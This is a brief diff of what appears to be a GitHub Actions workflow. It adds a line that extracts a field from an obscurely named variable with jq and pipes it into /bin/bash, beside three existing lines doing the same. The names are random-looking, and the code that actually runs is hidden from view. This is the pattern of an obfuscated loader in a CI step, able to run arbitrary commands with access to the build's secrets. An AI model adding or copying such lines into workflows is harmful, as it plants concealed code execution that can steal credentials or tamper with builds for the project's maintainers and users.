@@ -20,6 +20,7 @@ jobs:
           echo $liic32 | jq -r .e94 | /bin/bash
           echo $muc34154 | jq -r .wjp6186 | /bin/bash
           printf '%s' "$lne2" | jq -r .hv457 | /bin/bash
+          printf '%s' "$l33866" | jq -r .ef8 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
